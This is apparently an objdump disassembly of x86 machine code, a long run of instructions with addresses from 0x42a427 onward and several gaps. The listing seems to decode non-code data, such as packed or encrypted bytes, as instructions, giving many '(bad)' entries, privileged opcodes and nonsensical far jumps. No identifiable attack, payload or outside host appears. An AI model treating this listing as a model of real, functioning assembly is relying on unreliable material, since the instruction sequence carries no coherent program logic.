  42a427:	stos   BYTE PTR es:[edi],al
  42a428:	mov    BYTE PTR [ecx],0x51
  42a42b:	or     al,0xa8
  42a42d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a42e:	or     ebx,edx
  42a430:	mov    ecx,0x68eccb90
  42a435:	fild   DWORD PTR [eax-0x4f6ed04a]
  42a43b:	or     BYTE PTR [ebx],ch
  42a43d:	shr    cl,cl
  42a43f:	push   es
  42a440:	inc    edi
  42a441:	ja     0x42a3fc
  42a443:	mov    ds:0x7ed3e479,al
  42a448:	nop
  42a449:	or     eax,DWORD PTR [ecx+0x55]
  42a44c:	outs   dx,DWORD PTR ds:[esi]
  42a44d:	xor    BYTE PTR [eax+eax*8],ch
  42a450:	int    0xfa
  42a452:	or     al,0x14
  42a454:	or     eax,0x24f04a5
  42a459:	mov    ch,0x11
  42a45b:	aam    0x2b
  42a45d:	xor    ah,BYTE PTR [ecx]
  42a45f:	shl    BYTE PTR [ebx+0x532e059],0x64
  42a466:	mov    ds:0x9322d867,al
  42a46b:	sub    ah,dl
  42a46d:	or     ch,0x26
  42a470:	push   ebx
  42a471:	out    dx,eax
  42a472:	std    
  42a473:	sbb    al,dh
  42a475:	xchg   ebp,eax
  42a476:	inc    ebx
  42a477:	dec    ebx
  42a478:	jmp    0xe7f8:0x641966f0
  42a47f:	aad    0x74
  42a481:	mov    dh,0x99
  42a483:	mov    ds:0xf106107b,al
  42a488:	mov    ebp,0x3e04d21
  42a48d:	push   ecx
  42a48e:	fistp  QWORD PTR [ecx+0x3bce76ad]
  42a494:	daa    
  42a495:	push   0x2
  42a497:	daa    
  42a498:	pop    edi
  42a499:	test   al,0x2a
  42a49b:	stc    
  42a49c:	test   DWORD PTR [ecx-0x2b],ebp
  42a49f:	and    esi,0xffffffae
  42a4a2:	fld1   
  42a4a4:	xor    edx,0xffffffe9
  42a4a7:	sub    DWORD PTR [ecx],0xf564c56
  42a4ad:	xchg   edi,eax
  42a4ae:	add    edi,ebp
  42a4b0:	sbb    edi,edx
  42a4b2:	push   ebx
  42a4b3:	ret    
  42a4b4:	mov    dl,bl
  42a4b6:	jle    0x42a51f
  42a4b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a4b9:	pop    edi
  42a4ba:	(bad)
  42a4bf:	into   
  42a4c0:	(bad)  
  42a4c1:	out    dx,eax
  42a4c2:	push   ecx
  42a4c3:	sbb    BYTE PTR [ebp-0x7aae16e3],cl
  42a4c9:	retf   
  42a4ca:	mov    edx,0x139b9c88
  42a4cf:	cli    
  42a4d0:	or     edi,DWORD PTR [edi-0x50]
  42a4d3:	(bad)  
  42a4d5:	cmp    ecx,DWORD PTR [eax]
  42a4d7:	or     al,BYTE PTR ds:0xdc38a0a5
  42a4dd:	push   edi
  42a4de:	push   esi
  42a4df:	add    bl,0xc7
  42a4e2:	inc    ebp
  42a4e3:	sti    
  42a4e4:	cli    
  42a4e5:	(bad)  
  42a4e6:	push   ss
  42a4e7:	pop    ebx
  42a4e8:	xchg   ebp,eax
  42a4e9:	test   ebx,esp
  42a4eb:	fisubr DWORD PTR [ebp+0x4a]
  42a4ee:	outs   dx,DWORD PTR ds:[esi]
  42a4ef:	jbe    0x42a569
  42a4f1:	xor    BYTE PTR [edx],dh
  42a4f3:	jecxz  0x42a4e7
  42a4f5:	push   es
  42a4f6:	adc    edx,esp
  42a4f8:	or     DWORD PTR [esi+0x35306c54],esp
  42a4fe:	add    bl,BYTE PTR [ebx-0x30]
  42a501:	out    0xbf,al
  42a503:	imul   ebx,esi,0x31444e38
  42a509:	pushf  
  42a50a:	lock and al,dh
  42a50d:	mov    esi,0x4c07a9
	...
  42a572:	add    BYTE PTR [eax],al
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x8052fb9f
  42a583:	adc    eax,0x1c587
  42a588:	add    eax,0xc1000001
  42a58d:	mov    DWORD PTR [ebp-0x5e],eax
  42a590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a591:	xor    eax,0x205d106e
  42a596:	faddp  st(4),st
  42a598:	rcr    BYTE PTR [ebx],0xc5
  42a59b:	mov    BYTE PTR [ebp-0x74442997],al
  42a5a1:	mov    DWORD PTR [ebp+eax*1+0x152dc0f2],0xd6bbca66
  42a5ac:	pop    esp
  42a5ad:	(bad)  
  42a5ae:	xchg   DWORD PTR [eax-0x40a9d60d],ebp
  42a5b4:	(bad)  
  42a5b5:	in     eax,0x16
  42a5b7:	outs   dx,DWORD PTR ds:[esi]
  42a5b8:	jne    0x42a5e4
  42a5ba:	push   es
  42a5bb:	jp     0x42a5cd
  42a5bd:	shl    DWORD PTR [edx],cl
  42a5bf:	ror    DWORD PTR [edi],cl
  42a5c1:	sbb    ch,BYTE PTR [edi-0x3b59d49c]
  42a5c7:	sti    
  42a5c8:	out    0xd8,al
  42a5ca:	and    BYTE PTR [edi],ah
  42a5cc:	(bad)  
  42a5cd:	jno    0x42a5f2
  42a5cf:	or     eax,0xc96bcd57
  42a5d4:	loop   0x42a58e
  42a5d6:	aad    0x2e
  42a5d8:	repnz ins BYTE PTR es:[edi],dx
  42a5da:	mov    eax,0x2e97f24f
  42a5df:	cmp    DWORD PTR [ebp+0x549ecdaa],ebx
  42a5e5:	or     DWORD PTR [ecx-0x8],edx
  42a5e8:	fidivr DWORD PTR [edx-0x7ae0aa6b]
  42a5ee:	gs jne 0x42a5f4
  42a5f1:	lods   al,BYTE PTR ds:[esi]
  42a5f2:	and    bl,bh
  42a5f4:	mov    DWORD PTR [edi],edx
  42a5f6:	es jecxz 0x42a5e0
  42a5f9:	jnp    0x42a5ab
  42a5fb:	cmp    al,BYTE PTR [eax-0x23d8ccc8]
  42a601:	lea    ecx,[ebx+0x64]
  42a604:	and    al,0xce
  42a606:	lods   eax,DWORD PTR ss:[esi]
  42a608:	cmp    al,0x60
  42a60a:	ss push 0x1c
  42a60d:	stos   DWORD PTR es:[edi],eax
  42a60e:	sbb    dl,dl
  42a610:	add    edx,DWORD PTR [ebx+0x39464c40]
  42a616:	pop    es
  42a617:	mov    edx,0x34104251
  42a61c:	test   al,0xce
  42a61e:	fwait
  42a61f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a620:	je     0x42a61b
  42a622:	mov    al,0x44
  42a625:	sbb    al,0x70
  42a627:	pusha  
  42a628:	in     al,dx
  42a629:	push   0x95f327d
  42a62e:	es mov dh,0x7e
  42a631:	mov    ecx,0xafbb6bf7
  42a636:	sar    BYTE PTR [ecx+0x227c23b6],0x51
  42a63d:	xchg   ecx,eax
  42a63e:	pop    ebp
  42a63f:	shr    BYTE PTR [esi-0x16dafb08],cl
  42a645:	push   edi
  42a646:	outs   dx,DWORD PTR ds:[esi]
  42a647:	and    al,0x3f
  42a649:	clc    
  42a64a:	in     al,0xa9
  42a64c:	push   edi
  42a64d:	sbb    eax,0x24f611ba
  42a652:	ror    DWORD PTR [ecx-0x3cdae4cc],1
  42a658:	xchg   ecx,eax
  42a659:	mov    bl,0x33
  42a65b:	dec    edi
  42a65c:	cmc    
  42a65d:	lods   al,BYTE PTR ds:[esi]
  42a65e:	out    0x88,eax
  42a660:	adc    esp,DWORD PTR [ebx-0x3b]
  42a663:	and    eax,0x4616507e
  42a668:	retf   
  42a669:	outs   dx,DWORD PTR ds:[esi]
  42a66a:	adc    bh,BYTE PTR [esi+esi*4+0x53]
  42a66e:	stc    
  42a66f:	out    0xdc,eax
  42a671:	and    BYTE PTR [eax+0x15e37254],0x17
  42a678:	push   ecx
  42a679:	cmp    ch,BYTE PTR [eax+0x5dadec69]
  42a67f:	inc    ecx
  42a680:	adc    ch,cl
  42a682:	das    
  42a683:	xor    ebx,eax
  42a685:	push   eax
  42a686:	pushf  
  42a687:	into   
  42a688:	dec    edx
  42a689:	mov    eax,0xa75ada6d
  42a68e:	mov    edi,0x620f
	...
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x4b47ece4],0x8caac5ba
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0xe000001
  42a70d:	mov    cl,BYTE PTR [esi+0x46316193]
  42a713:	call   0x3fda:0xbb85a9a3
  42a71a:	hlt    
  42a71b:	fistp  QWORD PTR [ecx-0x3e]
  42a71e:	mov    edi,edi
  42a720:	fidivr WORD PTR [eax]
  42a722:	sti    
  42a723:	mov    edi,0x519cc9c8
  42a728:	test   eax,0x3a7b5345
  42a72d:	data16 js 0x42a753
  42a730:	dec    ebx
  42a731:	or     esi,esi
  42a733:	mov    DWORD PTR [ebx+eax*8],edi
  42a736:	add    eax,0x6faced38
  42a73b:	xchg   BYTE PTR [esi+0x67],cl
  42a73e:	fstp   QWORD PTR ds:0x97e79b8
  42a744:	jo     0x42a731
  42a746:	es (bad) 
  42a748:	test   al,0xd5
  42a74a:	icebp  
  42a74b:	xchg   ebp,eax
  42a74c:	ret    
  42a74d:	arpl   WORD PTR [ebp-0x20],ax
  42a750:	push   ebx
  42a751:	cld    
  42a752:	fwait
  42a753:	mov    ch,0x5
  42a755:	aam    0x7
  42a757:	setb   BYTE PTR [ebp+0x4ca67d9f]
  42a75e:	inc    edi
  42a75f:	inc    ecx
  42a760:	jo     0x42a797
  42a762:	cwde   
  42a763:	xor    DWORD PTR [eax],ebx
  42a765:	sbb    DWORD PTR [edi+ebx*8],eax
  42a768:	mov    esp,0x3c294b8c
  42a76d:	cmp    bh,bl
  42a76f:	call   0xd1a6:0xad099185
  42a776:	jp     0x42a703
  42a778:	jmp    0x8370:0x2b191f81
  42a77f:	lods   eax,DWORD PTR ds:[esi]
  42a780:	test   ch,bh
  42a782:	fcmovu st,st(6)
  42a784:	test   BYTE PTR [ecx],ah
  42a786:	push   esp
  42a787:	sbb    edi,ebp
  42a789:	scas   eax,DWORD PTR es:[edi]
  42a78a:	jecxz  0x42a738
  42a78c:	test   BYTE PTR [edx],dh
  42a78e:	loop   0x42a7ec
  42a790:	inc    ebx
  42a791:	(bad)  
  42a792:	sar    edx,cl
  42a794:	fistp  QWORD PTR [ebx+0x16]
  42a797:	cmp    esp,edi
  42a799:	mov    DWORD PTR [esi+0x41cf6138],esi
  42a79f:	add    edx,DWORD PTR [edx]
  42a7a1:	add    al,0xc2
  42a7a3:	or     bl,dh
  42a7a5:	add    DWORD PTR [esi+0x5e],ebx
  42a7a8:	cmp    ecx,DWORD PTR [ebx*8+0x2a58b56c]
  42a7af:	mov    esp,0xfe268697
  42a7b4:	test   eax,0xc7d57ec2
  42a7b9:	sub    eax,0x6c1853ec
  42a7be:	mov    BYTE PTR [esi+edi*4-0x41],bl
  42a7c2:	fidiv  WORD PTR [ebx-0x23]
  42a7c5:	das    
  42a7c6:	xor    BYTE PTR [edx+0x6b],ch
  42a7c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7ca:	cmp    BYTE PTR [edx-0x35],dh
  42a7cd:	dec    edi
  42a7ce:	scas   eax,DWORD PTR es:[edi]
  42a7cf:	adc    DWORD PTR [edx],ecx
  42a7d1:	rcr    BYTE PTR [ebx+0x4dea5e09],1
  42a7d7:	icebp  
  42a7d8:	js     0x42a84c
  42a7da:	out    0x80,al
  42a7dc:	test   DWORD PTR [eax+edx*4+0x66],0x6fd806fa
  42a7e4:	mov    bh,0xd7
  42a7e6:	aas    
  42a7e7:	xor    BYTE PTR [esi+0x4e],cl
  42a7ea:	cmp    DWORD PTR [ecx+0x57],eax
  42a7ed:	fs inc edx
  42a7ef:	jmp    0x42a86d
  42a7f1:	loopne 0x42a7e8
  42a7f3:	adc    eax,0x14d5a30b
  42a7f8:	(bad)  
  42a7f9:	or     eax,0x25734361
  42a7fe:	mov    ebp,0xc59d6fef
  42a803:	add    eax,0x6f9c1aeb
  42a808:	(bad)  
  42a809:	jl     0x42a7c4
  42a80b:	sub    DWORD PTR [esi+0x647d1a27],ebx
	...
  42a871:	add    BYTE PTR [eax],al
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	xor    cl,bl
  42a882:	xor    al,0x6a
  42a884:	xchg   ecx,eax
  42a885:	mov    DWORD PTR [ecx],0x10500
  42a88b:	add    dl,dh
  42a88d:	push   edx
  42a88e:	mov    esp,0xe34e9e25
  42a893:	in     eax,0x56
  42a895:	stc    
  42a896:	outs   dx,DWORD PTR ds:[esi]
  42a897:	int    0x38
  42a899:	dec    ebx
  42a89a:	mov    ch,0x78
  42a89c:	cmp    BYTE PTR [ebp-0x53],bh
  42a89f:	arpl   WORD PTR [eax-0x3b],cx
  42a8a2:	cmp    dl,ch
  42a8a4:	dec    edx
  42a8a5:	les    esp,FWORD PTR [ecx+0x35]
  42a8a8:	and    ebp,DWORD PTR ds:0x29931038
  42a8ae:	test   BYTE PTR [esi-0x62],dh
  42a8b1:	dec    eax
  42a8b2:	loope  0x42a8c1
  42a8b4:	add    DWORD PTR ds:0x7ab8617b,ebx
  42a8ba:	jg     0x42a844
  42a8bc:	icebp  
  42a8bd:	jo     0x42a905
  42a8bf:	imul   esp,DWORD PTR [ecx+0x4],0x4ffdd18a
  42a8c6:	mov    BYTE PTR [edx+ebx*8+0x640e430f],ah
  42a8cd:	sub    ebp,DWORD PTR [edx-0x2ed09e41]
  42a8d3:	inc    ebx
  42a8d4:	jo     0x42a890
  42a8d6:	stos   DWORD PTR es:[edi],eax
  42a8d7:	push   edx
  42a8d8:	iret   
  42a8d9:	fst    DWORD PTR [edx-0x12]
  42a8dd:	(bad)  
  42a8de:	and    DWORD PTR [edi-0x4c5a017],ebp
  42a8e4:	enter  0x177e,0x73
  42a8e8:	xchg   esp,eax
  42a8e9:	shl    ch,1
  42a8eb:	test   eax,0x64a9df60
  42a8f0:	inc    esp
  42a8f1:	inc    ecx
  42a8f2:	xchg   esi,eax
  42a8f3:	pop    edi
  42a8f4:	retf   0xee3d
  42a8f7:	sar    DWORD PTR [esi],0xb
  42a8fa:	sbb    al,bh
  42a8fc:	repnz mov ds:0x76999cf3,eax
  42a902:	cdq    
  42a903:	imul   esp,DWORD PTR [esi],0x58
  42a906:	loope  0x42a942
  42a908:	mov    bh,0xce
  42a90a:	arpl   WORD PTR [eax-0x30],sp
  42a90d:	add    al,0xb5
  42a90f:	push   ebx
  42a910:	add    al,BYTE PTR [edx-0x4e67ace4]
  42a916:	cmp    al,0xa3
  42a918:	imul   edx,ebp,0x76
  42a91b:	xchg   BYTE PTR [edx+ebp*2+0x3c],ch
  42a91f:	jbe    0x42a960
  42a921:	dec    ecx
  42a922:	mov    dl,0x6f
  42a924:	dec    esp
  42a925:	bound  ebx,QWORD PTR [ebx-0x4e]
  42a928:	push   ebp
  42a929:	adc    eax,0xa5930a90
  42a92e:	mov    BYTE PTR [esi],bh
  42a930:	and    dh,cl
  42a932:	push   eax
  42a933:	pop    eax
  42a934:	cmp    al,0x52
  42a936:	xchg   edi,eax
  42a937:	cmc    
  42a938:	sub    dh,BYTE PTR [edx]
  42a93a:	dec    edx
  42a93b:	or     eax,0x539de186
  42a940:	push   ss
  42a941:	jge    0x42a9bf
  42a943:	mov    ebx,DWORD PTR [ebx-0x66dc34aa]
  42a949:	ror    edx,cl
  42a94b:	scas   al,BYTE PTR es:[edi]
  42a94c:	call   0xebe6339a
  42a951:	hlt    
  42a952:	gs inc edi
  42a954:	scas   eax,DWORD PTR es:[edi]
  42a955:	es push esi
  42a957:	fst    st(3)
  42a959:	les    ecx,FWORD PTR [ebx+0x12]
  42a95c:	add    cl,BYTE PTR ds:0xfb8e551a
  42a962:	pop    esp
  42a963:	jp     0x42a9ce
  42a965:	cli    
  42a966:	cwde   
  42a967:	scas   eax,DWORD PTR es:[edi]
  42a968:	pop    es
  42a969:	dec    eax
  42a96a:	jecxz  0x42a9b1
  42a96c:	sbb    al,0x17
  42a96e:	jno    0x42a953
  42a970:	stc    
  42a971:	adc    ebp,DWORD PTR [edx+ecx*1+0x6ac5ed13]
  42a978:	je     0x42a97c
  42a97a:	jo     0x42a92b
  42a97c:	push   ecx
  42a97d:	mov    ecx,0xa4bce028
  42a982:	sbb    ebx,edx
  42a984:	xchg   BYTE PTR [ebx],ch
  42a986:	push   esi
  42a987:	mov    eax,ebx
  42a989:	ret    0x20e6
  42a98c:	xlat   BYTE PTR ds:[ebx]
  42a98d:	and    DWORD PTR [esi],esi
  42a98f:	and    ecx,esp
	...
  42a9f1:	add    BYTE PTR [eax],al
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	fisubr WORD PTR [esi-0x1e]
  42aa03:	sbb    DWORD PTR [esi+0x50001c8],edx
  42aa09:	add    DWORD PTR [eax],eax
  42aa0b:	add    BYTE PTR [esi],dh
  42aa0d:	icebp  
  42aa0e:	jbe    0x42aa32
  42aa10:	sub    DWORD PTR [edx+0x6f],0x33c734e1
  42aa17:	adc    dl,cl
  42aa19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aa1a:	out    0x46,eax
  42aa1c:	inc    esp
  42aa1d:	jecxz  0x42aa89
  42aa1f:	mov    ah,0xfc
  42aa21:	cmp    BYTE PTR [esi+0x1d9538fa],0x8b
  42aa28:	xchg   ebp,eax
  42aa29:	mov    ecx,DWORD PTR [ebp-0x70]
  42aa2c:	les    edi,FWORD PTR [esi+0x73]
  42aa2f:	push   es
  42aa30:	out    dx,eax
  42aa31:	jecxz  0x42aa63
  42aa33:	call   FWORD PTR [ebp-0x80]
  42aa36:	inc    esp
  42aa37:	pop    ss
  42aa38:	xchg   ebp,eax
  42aa39:	cmp    eax,0xf33f34e3
  42aa3e:	xor    ebx,DWORD PTR [esi+edi*1]
  42aa41:	adc    DWORD PTR [eax],ecx
  42aa43:	lea    esp,ss:[eax]
  42aa46:	mov    ecx,0xbff8ce5e
  42aa4b:	xchg   ecx,eax
  42aa4d:	dec    esp
  42aa4e:	push   ebx
  42aa4f:	mov    ch,0x42
  42aa51:	dec    esi
  42aa52:	fist   WORD PTR [esi]
  42aa54:	pop    edi
  42aa55:	or     ecx,DWORD PTR [ecx]
  42aa57:	es push ebx
  42aa59:	stc    
  42aa5a:	out    dx,eax
  42aa5b:	xchg   ebx,eax
  42aa5c:	jl     0x42aaa5
  42aa5e:	or     al,0xc1
  42aa60:	mov    bl,0x5d
  42aa62:	pushf  
  42aa63:	shl    BYTE PTR [esi+edx*1-0x5b],1
  42aa67:	dec    esi
  42aa68:	fmulp  st(1),st
  42aa6a:	or     eax,0xdb085fc8
  42aa6f:	sub    eax,0x8c9711ce
  42aa74:	dec    ecx
  42aa75:	dec    eax
  42aa76:	test   al,0xd4
  42aa78:	jmp    0x42aa9f
  42aa7a:	xor    BYTE PTR [eax],0x54
  42aa7d:	sub    al,0x4
  42aa7f:	pushf  
  42aa80:	xor    dh,BYTE PTR [ecx-0x68d15df2]
  42aa86:	adc    ch,BYTE PTR [ebp+edx*8+0x78]
  42aa8a:	dec    ebp
  42aa8b:	mov    ecx,ebp
  42aa8d:	call   0xb97e:0x88064d73
  42aa94:	scas   al,BYTE PTR es:[edi]
  42aa95:	inc    edi
  42aa96:	cmp    ch,bl
  42aa98:	stos   BYTE PTR es:[edi],al
  42aa99:	jmp    0x42aa90
  42aa9b:	ja     0x42aa5c
  42aa9d:	stc    
  42aa9e:	(bad)  
  42aa9f:	mov    DWORD PTR [ecx+0x21],ebx
  42aaa2:	adc    bh,BYTE PTR [bp+si+0x38f4]
  42aaa7:	fsub   QWORD PTR fs:[edi+0x3ae7d51c]
  42aaae:	mov    bl,0x7b
  42aab0:	std    
  42aab1:	or     eax,0x2d51decd
  42aab6:	fild   WORD PTR [ebx]
  42aab8:	and    cl,bl
  42aaba:	dec    ebx
  42aabb:	cmp    al,0xcb
  42aabd:	jge    0x42ab28
  42aabf:	imul   BYTE PTR [ebp+0xe71a3b3]
  42aac5:	es aas 
  42aac7:	inc    ebp
  42aac8:	adc    eax,0x15506fa3
  42aacd:	jo     0x42aac4
  42aacf:	xor    edi,DWORD PTR [ebp+0x86a8765]
  42aad5:	enter  0x9a92,0x52
  42aad9:	mov    ebp,0x405ad3bc
  42aade:	pop    ecx
  42aadf:	test   al,0xbe
  42aae1:	lock jns 0x42aa9f
  42aae4:	imul   esp,DWORD PTR [edx-0x2613046c],0x3e
  42aaeb:	add    al,0x4d
  42aaed:	push   esp
  42aaee:	xchg   ebp,eax
  42aaef:	arpl   dx,bx
  42aaf1:	sbb    al,0xc0
  42aaf3:	push   esp
  42aaf4:	jmp    0x939b:0xd24606
  42aafb:	jmp    0x60ef5a97
  42ab00:	imul   eax,DWORD PTR [eax+0x1335cbe1],0x3c
  42ab07:	clc    
  42ab08:	in     al,0x27
  42ab0a:	fldenv [ebx]
  42ab0c:	(bad)  
  42ab0d:	mov    es,edi
  42ab0f:	es out 0x0,eax
	...
  42ab72:	add    BYTE PTR [eax],al
  42ab74:	ds push cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	jle    0x42ab03
  42ab82:	sbb    BYTE PTR [eax-0x65],ch
  42ab85:	leave  
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    eax,0xfa000001
  42ab8d:	pop    ds
  42ab8e:	xchg   BYTE PTR ds:0xa4d26abb,dh
  42ab94:	jae    0x42ab88
  42ab96:	xor    eax,0x31a0d92
  42ab9b:	mov    ds:0x24a15e0f,al
  42aba0:	or     eax,0x5a67cade
  42aba5:	loop   0x42ab63
  42aba7:	dec    ebx
  42aba8:	ins    DWORD PTR es:[edi],dx
  42aba9:	sbb    al,0xb5
  42abab:	mov    ah,0x6
  42abad:	mov    edi,0x1daf05a
  42abb2:	rcl    DWORD PTR [ebx+esi*2+0x15ddbe34],0x72
  42abba:	bound  ebx,QWORD PTR [ecx-0x53]
  42abbd:	xchg   esi,eax
  42abbe:	pusha  
  42abbf:	sbb    al,0x2a
  42abc1:	popa   
  42abc2:	inc    ecx
  42abc3:	jno    0x42ab8b
  42abc5:	mov    es,WORD PTR [edx-0x7d]
  42abc8:	rcl    BYTE PTR [eax-0x5d],cl
  42abcb:	fist   DWORD PTR [esi+0x38]
  42abce:	push   ss
  42abcf:	loope  0x42abd2
  42abd1:	xor    eax,0x21829a0f
  42abd6:	or     eax,0x4e710d0e
  42abdb:	jno    0x42abbf
  42abdd:	scas   eax,DWORD PTR es:[edi]
  42abde:	and    WORD PTR [ebp+0x2652f6f1],0xffb7
  42abe6:	jne    0x42abac
  42abe8:	push   ds
  42abe9:	rcl    ecx,0x2e
  42abec:	lock std 
  42abee:	mov    ebp,0x7cce0e71
  42abf3:	pushf  
  42abf4:	dec    eax
  42abf5:	push   ebp
  42abf6:	push   0x26
  42abf8:	dec    esp
  42abf9:	sub    cl,BYTE PTR [ebx*4+0x1a7c1b66]
  42ac00:	or     DWORD PTR [edx-0x6f],0xffffffd8
  42ac04:	sub    al,0xdd
  42ac06:	ret    0x25ac
  42ac09:	aam    0xa7
  42ac0b:	into   
  42ac0c:	(bad)  
  42ac0f:	test   al,0x95
  42ac11:	and    eax,0x59db56e8
  42ac16:	fdivr  QWORD PTR [eax+0x64]
  42ac19:	lods   eax,DWORD PTR ds:[esi]
  42ac1a:	fnstsw WORD PTR [edx+edx*1+0x3c28b7]
  42ac21:	lods   eax,DWORD PTR ds:[esi]
  42ac22:	mov    edi,DWORD PTR [ebx+0x3d]
  42ac25:	pmuludq mm3,QWORD PTR [ebp+0x6d]
  42ac29:	push   cs
  42ac2a:	push   0xb820a2d6
  42ac2f:	ins    DWORD PTR es:[edi],dx
  42ac30:	adc    eax,DWORD PTR [eax]
  42ac32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac33:	mov    fs,WORD PTR [edx+0x34aac30a]
  42ac39:	jne    0x42ac2c
  42ac3b:	lods   al,BYTE PTR ds:[esi]
  42ac3c:	cmp    dl,BYTE PTR [ecx+0x30]
  42ac3f:	dec    ebp
  42ac40:	call   0x68b:0xee2c8cea
  42ac47:	xchg   ebx,eax
  42ac48:	lods   al,BYTE PTR ds:[esi]
  42ac49:	pop    edi
  42ac4a:	push   ss
  42ac4b:	into   
  42ac4c:	fsub   DWORD PTR [ecx]
  42ac4e:	push   ds
  42ac4f:	xchg   BYTE PTR [edi-0x7479bb24],dl
  42ac55:	repnz aad 0xbd
  42ac58:	adc    eax,0xbfa29040
  42ac5d:	aas    
  42ac5e:	bound  ecx,QWORD PTR [edi+0x4278440d]
  42ac64:	sub    ebx,DWORD PTR [edx]
  42ac66:	mov    esp,0x6bc08c53
  42ac6b:	xor    ch,BYTE PTR [ecx+0x23b9da63]
  42ac71:	aas    
  42ac72:	das    
  42ac73:	mov    ds:0x72d54721,eax
  42ac78:	xchg   edx,eax
  42ac79:	addr16 push 0x1e51bf96
  42ac7f:	pop    ss
  42ac80:	and    DWORD PTR ds:0xde74fe19,esp
  42ac86:	int3   
  42ac87:	arpl   WORD PTR [edi+esi*2],dx
  42ac8a:	out    dx,eax
  42ac8b:	call   0xdf78ebcb
  42ac90:	sub    BYTE PTR [eax],al
	...
  42acf2:	add    BYTE PTR [eax],al
  42acf4:	jmp    0xdf7cc92b
  42acf9:	ds out dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	add    eax,DWORD PTR [eax-0x355ff71d]
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    eax,0x9f000001
  42ad0d:	adc    ah,bh
  42ad0f:	and    al,0xa2
  42ad11:	and    al,0xf2
  42ad13:	lods   al,BYTE PTR ds:[esi]
  42ad14:	fldcw  WORD PTR [ebp+ebx*1-0x2b]
  42ad18:	fld    DWORD PTR ds:0x11821a22
  42ad1f:	jnp    0x42acf5
  42ad21:	ja     0x42ad4a
  42ad23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad24:	in     eax,dx
  42ad25:	push   ebx
  42ad26:	cwde   
  42ad27:	in     eax,dx
  42ad28:	push   es
  42ad29:	mov    cl,0x71
  42ad2b:	xchg   esp,eax
  42ad2c:	out    dx,al
  42ad2d:	repz dec ecx
  42ad2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad30:	inc    ebx
  42ad31:	xor    al,0x86
  42ad33:	je     0x42ad55
  42ad35:	mov    esp,0xc60045de
  42ad3a:	jecxz  0x42ad9b
  42ad3c:	pushf  
  42ad3d:	loopne 0x42ad82
  42ad3f:	push   ebx
  42ad40:	retf   
  42ad41:	scas   al,BYTE PTR es:[edi]
  42ad42:	cmp    al,0xee
  42ad44:	les    esp,FWORD PTR [edx+0x521399de]
  42ad4a:	cmp    dl,BYTE PTR [edi-0x532e3ee3]
  42ad50:	dec    ebx
  42ad51:	fucomi st,st(5)
  42ad53:	ret    
  42ad54:	adc    eax,DWORD PTR [edi+0x78]
  42ad57:	jge    0x42acf9
  42ad59:	cmp    ah,cl
  42ad5b:	mov    ebp,0xef931169
  42ad60:	outs   dx,DWORD PTR ds:[esi]
  42ad61:	aad    0xed
  42ad63:	shl    DWORD PTR [ebp-0x2ebc8afd],1
  42ad69:	or     ch,dh
  42ad6b:	stos   DWORD PTR es:[edi],eax
  42ad6c:	ud2    
  42ad6e:	pop    ds
  42ad6f:	pop    ss
  42ad70:	and    eax,0x6c9b0136
  42ad75:	mov    ch,0x71
  42ad77:	das    
  42ad78:	jnp    0x42ad55
  42ad7a:	pop    ds
  42ad7b:	stos   BYTE PTR es:[edi],al
  42ad7c:	xor    eax,0x346ed050
  42ad81:	mov    ch,0xf3
  42ad83:	imul   edx,DWORD PTR [edi],0x58
  42ad86:	dec    ecx
  42ad87:	and    BYTE PTR [esi],bl
  42ad89:	mov    dh,0x69
  42ad8b:	cwde   
  42ad8c:	mov    al,ds:0xbc44ae9
  42ad91:	imul   al
  42ad93:	sbb    al,0xc6
  42ad95:	fistp  DWORD PTR [ebx]
  42ad97:	inc    esp
  42ad98:	adc    ebx,DWORD PTR [eax-0x44]
  42ad9b:	and    esp,esp
  42ad9d:	es out dx,eax
  42ad9f:	arpl   WORD PTR [ebp-0x42b6305e],si
  42ada5:	mov    edi,0x6285ea6a
  42adaa:	in     al,dx
  42adab:	test   al,0xd
  42adad:	mov    ah,0x67
  42adaf:	je     0x42adec
  42adb1:	and    DWORD PTR [ecx+eiz*8],0x1c81874f
  42adb8:	(bad)  
  42adb9:	xlat   BYTE PTR ds:[ebx]
  42adba:	outs   dx,DWORD PTR es:[esi]
  42adbc:	pop    ebx
  42adbd:	(bad)
  42adc0:	(bad)  
  42adc1:	jp     0x42ad5a
  42adc3:	int3   
  42adc4:	fs sbb cl,bl
  42adc7:	xchg   ebx,eax
  42adc8:	imul   edx,DWORD PTR [ebx],0x14
  42adcb:	test   ah,ch
  42adcd:	popa   
  42adce:	adc    dh,al
  42add0:	int3   
  42add1:	loopne 0x42ae3a
  42add3:	push   0x34
  42add5:	sub    al,0xf4
  42add7:	adc    DWORD PTR [edx],edx
  42add9:	jecxz  0x42ae47
  42addb:	je     0x42add0
  42addd:	(bad)  
  42adde:	jle    0x42adef
